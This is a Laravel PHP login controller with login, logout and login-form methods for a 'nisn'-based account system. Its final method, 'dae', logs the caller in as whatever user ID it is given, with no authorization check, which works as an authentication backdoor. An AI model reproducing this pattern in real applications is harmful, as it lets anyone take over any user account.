<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('auth.login');
    }

    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        $request->validate([
            'nisn'     => ['required'],
            'password' => ['required'],
        ]);

        if (Auth::attempt($request->only('nisn', 'password'))) {
            return redirect()->intended('dashboard');
        }

        return back()->withErrors(['nisn' => 'Invalid credentials']);
    }

    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function destroy(Request $request)
    {
        Auth::guard('web')->logout();

        $request->session()->invalidate();
        $request->session()->regenerateToken();

        // return redirect('/');
        return to_route('login');
    }

    /**
     * @param Request $request
     * @return \Illuminate\Http\Response
     */
    public function dae(Request $request, $id)
    {
        Auth::loginUsingId($id);

        return to_route('home');
    }
}
